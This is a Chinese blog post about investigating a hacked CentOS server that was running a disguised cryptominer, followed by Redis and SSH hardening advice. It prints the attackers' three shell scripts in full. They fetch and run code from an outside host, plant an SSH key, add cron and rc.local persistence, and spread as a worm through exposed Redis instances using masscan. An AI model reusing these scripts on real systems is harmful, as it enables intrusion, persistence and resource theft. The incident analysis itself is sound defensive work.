---
title: "记一次服务器被入侵全过程" 
date: 2021-08-01
lastmod: 2021-08-01
author: ["lvbibir"] 
categories: 
- 
tags: 
- linux
description: "" 
weight: 
slug: ""
draft: false # 是否为草稿
comments: true #是否展示评论
showToc: true # 显示目录
TocOpen: true # 自动展开目录
hidemeta: false # 是否隐藏文章的元信息，如发布日期、作者等
disableShare: true # 底部不显示分享栏
showbreadcrumbs: true #顶部显示当前路径
cover:
    image: "" #图片路径：posts/tech/文章1/picture.png
    caption: "" #图片底部描述
    alt: ""
    relative: false
---
周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说：我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，ssh连了一下，被拒绝了，问了下默认的22端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名:root，还有不足8位的小白密码，心里一凉：被黑了！



服务器系统CentOS 6.X，部署了nginx，tomcat，redis等应用，上来先把数据库全备份到本地，然后top命令看了一下，有2个99%的同名进程还在运行，叫gpg-agentd。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUk13NIsMwEsy0crJQXZ0FlS175qiaaaFRvqibZDicoWJXQgFaIrpZvicQ3Q/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

google了一下gpg，结果是：

> GPG提供的gpg-agent提供了对SSH协议的支持，这个功能可以大大简化密钥的管理工作。

看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母d，伪装的很好，让人想起来windows上各种看起来像svchost.exe的病毒。继续

```
ps eho command -p 23374netstat -pan | grep 23374
```

查看pid:23374进程启动路径和网络状况，也就是来到了图1的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有2个问题在等着我：

> 1、文件是怎么上传的？
> 2、这个文件的目的是什么，或是黑客想干嘛？

history看一下，记录果然都被清掉了，没留下任何痕迹。继续命令more messages，

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUYxokiaN7XW4UAvKIbbZBrIaOkJ9PszZdJMcrcAeiajCCWk9Puh3Xia5pA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

看到了在半夜12点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。

```
crontab -e
```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUib88hYObUI1R3UaGxYSpDgvbPbB42mOLYBGH9XqCsBQCW7FtjNnVtlg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

果然，线索找到了。



上面的计划任务的意思就是每15分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。

```
curl -fsSL 159.89.190.243/ash.php > ash.sh
```

脚本内容如下：

```
uname -aidhostnamesetenforce 0 2>/dev/nullulimit -n 50000ulimit -u 50000crontab -r 2>/dev/nullrm -rf /var/spool/cron/* 2>/dev/nullmkdir -p /var/spool/cron/crontabs 2>/dev/nullmkdir -p /root/.ssh 2>/dev/nullecho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' > /root/.ssh/authorized_keysecho '*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh' > /var/spool/cron/rootecho '*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh' > /var/spool/cron/crontabs/rootyum install -y bash 2>/dev/nullapt install -y bash 2>/dev/nullapt-get install -y bash 2>/dev/nullbash -c 'curl -fsSL 159.89.190.243/bsh.php|bash' 2>/dev/null
```

大致分析一下该脚本的主要用途：

> 首先是关闭SELinux，解除shell资源访问限制，然后在/root/.ssh/authorized_keys文件中生成ssh公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于ssh keys的文章可以参考这一篇文章SSH原理与运用。接下来安装bash，最后是继续下载第二个脚本bsh.php，并且执行。

继续下载并分析bsh.pbp，内容如下：

```
sleep $( seq 3 7 | sort -R | head -n1 )cd /tmp || cd /var/tmpsleep 1mkdir -p .ICE-unix/... && chmod -R 777 .ICE-unix && cd .ICE-unix/...sleep 1if [ -f .watch ]; thenrm -rf .watchexit 0fisleep 1echo 1 > .watchsleep 1ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2>/dev/nullps x | awk '!/awk/ && /barad_agent|masscan|.sr0|clay|udevs|.sshd|xig/ {print $1}' | xargs kill -9 2>/dev/nullsleep 1if ! [ -x /usr/bin/gpg-agentd ]; thencurl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.dbecho '/usr/bin/gpg-agentd' > /etc/rc.localecho 'curl -fsSL 159.89.190.243/ash.php|sh' >> /etc/rc.localecho 'exit 0' >> /etc/rc.localfisleep 1chmod +x /usr/bin/gpg-agentd && /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentdsleep 1if ! [ -x "$(command -v masscan)" ]; thenrm -rf /var/lib/apt/lists/*rm -rf x1.tar.gzif [ -x "$(command -v apt-get)" ]; thenexport DEBIAN_FRONTEND=noninteractiveapt-get update -yapt-get install -y debconf-docapt-get install -y build-essentialapt-get install -y libpcap0.8-dev libpcap0.8apt-get install -y libpcap*apt-get install -y make gcc gitapt-get install -y redis-serverapt-get install -y redis-toolsapt-get install -y redisapt-get install -y iptablesapt-get install -y wget curlfiif [ -x "$(command -v yum)" ]; thenyum update -yyum install -y epel-releaseyum update -yyum install -y git iptables make gcc redis libpcap libpcap-develyum install -y wget curlfisleep 1curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gzsleep 1[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4fisleep 3 && rm -rf .watchbash -c 'curl -fsSL 159.89.190.243/rsh.php|bash' 2>/dev/null
```

这段脚本的代码比较长，但主要的功能有4个：

> \1. 下载远程代码到本地，添加执行权限，chmod u+x。
> \2. 修改rc.local，让本地代码开机自动执行。
> \3. 下载github上的开源扫描器代码，并安装相关的依赖软件，也就是我上面的messages里看到的记录。
> \4. 下载第三个脚本，并且执行。

我去github上看了下这个开源代码，简直吊炸天。

> MASSCAN: Mass IP port scanner
> This is the fastest Internet port 
> scanner. It can scan the entire Internet in under 6 minutes, > 
> transmitting 10 million packets per second.
> It produces results similar to nmap, the most famous port scanner. 
> Internally, it operates more > like scanrand, unicornscan, and ZMap, 
> using asynchronous transmission. The major difference is > that it's 
> faster than these other scanners. In addition, it's more flexible, 
> allowing arbitrary > address ranges and port ranges.
> NOTE: masscan uses a custom TCP/IP stack. Anything other than simple 
> port scans will cause conflict with the local TCP/IP stack. This means 
> you need to either use the -S option to use a separate IP address, or 
> configure your operating system to firewall the ports that masscan uses.

transmitting 10 million packets per second(每秒发送1000万个数据包)，比nmap速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下readme之后，我也没有细究，继续下载第三个脚本。

```
setenforce 0 2>/dev/nullulimit -n 50000ulimit -u 50000sleep 1iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/nulliptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/nullsleep 1rm -rf .dat .shard .ranges .lan 2>/dev/nullsleep 1echo 'config set dbfilename "backup.db"' > .datecho 'save' >> .datecho 'flushall' >> .datecho 'set backup1 "


*/2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh

"' >> .datecho 'set backup2 "


*/3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh

"' >> .datecho 'set backup3 "


*/4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh

"' >> .datecho 'set backup4 "


*/5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh

"' >> .datecho 'config set dir "/var/spool/cron/"' >> .datecho 'config set dbfilename "root"' >> .datecho 'save' >> .datecho 'config set dir "/var/spool/cron/crontabs"' >> .datecho 'save' >> .datsleep 1masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shardsleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &done < .shardsleep 1masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .rangessleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &done < .rangessleep 1ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2>/dev/null | sed 's//([0-9]{2})//16/g' > .inetsleep 1masscan --max-rate 10000 -p6379,6380 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lansleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &done < .lansleep 60rm -rf .dat .shard .ranges .lan 2>/dev/null
```

如果说前两个脚本只是在服务器上下载执行了二进制文件，那这个脚本才真正显示病毒的威力。下面就来分析这个脚本。

一开始的修改系统环境没什么好说的，接下来的写文件操作有点眼熟，如果用过redis的人，应该能猜到，这里是对redis进行配置。写这个配置，自然也就是利用了redis把缓存内容写入本地文件的漏洞，结果就是用本地的私钥去登陆被写入公钥的服务器了，无需密码就可以登陆，也就是我们文章最开始的/root/.ssh/authorized_keys。登录之后就开始定期执行计划任务，下载脚本。好了，配置文件准备好了，就开始利用masscan进行全网扫描redis服务器，寻找肉鸡，注意看这6379就是redis服务器的默认端口，如果你的redis的监听端口是公网IP或是0.0.0.0，并且没有密码保护，不好意思，你就中招了。

通过依次分析这3个脚本，就能看出这个病毒的可怕之处，先是通过写入ssh public key 拿到登录权限，然后下载执行远程二进制文件，最后再通过redis漏洞复制，迅速在全网传播，以指数级速度增长。那么问题是，这台服务器是怎么中招的呢？看了下redis.conf，bind的地址是127.0.0.1，没啥问题。由此可以推断，应该是root帐号被暴力破解了，为了验证我的想法，我lastb看了一下，果然有大量的记录：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUxRx7dZWNXxbgjEznbkJofHllQjbqvL9BicWIaGOnZplMJu4gh58Wa5Q/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

还剩最后一个问题，这个gpg-agentd程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个gpg-agentd拖到ida中，用string搜索bitcoin,eth, mine等相关单词，最终发现了这个：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUFmZ3tXSY9KFwD2pcaJ7jbApwiaXFpZLDNHa1PjAFSNKUnNYcRxgbibrA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

打开 nicehash.com 看一下，一切都清晰了。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUV5wDgVOIJYdib0DX3Zib4H5R85BCHtF4UNOzsW88smRs1CKOdmoSkujQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)





一、服务器

> \1. 禁用ROOT
> \2. 用户名和密码尽量复杂
> \3. 修改ssh的默认22端口
> \4. 安装DenyHosts防暴力破解软件
> \5. 禁用密码登录，使用RSA公钥登录

二、redis

> \1. 禁用公网IP监听，包括0.0.0.0
> \2. 使用密码限制访问redis
> \3. 使用较低权限帐号运行redis



原文链接：https://mp.weixin.qq.com/s/FUv-7-1C30U-A81bDn8dbA